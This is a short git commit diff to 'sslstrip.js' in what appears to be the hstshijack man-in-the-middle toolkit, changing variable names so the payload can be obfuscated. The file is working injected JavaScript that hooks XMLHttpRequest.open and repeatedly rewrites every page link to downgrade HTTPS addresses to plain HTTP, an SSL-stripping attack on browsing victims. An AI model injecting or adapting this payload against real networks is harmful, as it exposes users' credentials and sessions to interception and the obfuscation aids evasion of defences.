7c278d44824d23e6ee17b1c82faddad51c734e06
yungtravla <lilprismontour@gmail.com>
2018-09-19 11:03:03 +1000

    make sslstrip payload obfuscatable

--- hstshijack/payloads/sslstrip.js
+++ hstshijack/payloads/sslstrip.js
@@ -1,12 +1,11 @@
 XMLHttpRequest.prototype.obf_open = XMLHttpRequest.prototype.open
-XMLHttpRequest.prototype.open = function(method, url, async, username, password) {
-	url = url.replace(/(http)s/ig, "$1")
-
-	XMLHttpRequest.prototype.obf_open(method, url, async, username, password)
+XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
+	obf_var_url = obf_var_url.replace(/^(http)s/ig, "$1")
+	XMLHttpRequest.prototype.obf_open(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password)
 }
 
 setInterval(function(){
 	document.querySelectorAll("a").forEach(function(obf_a){
-		obf_a.href = obf_a.href.replace(/(http)s/ig, "http")
+		obf_a.href = obf_a.href.replace(/^(http)s/ig, "http")
 	})
 }, 666)
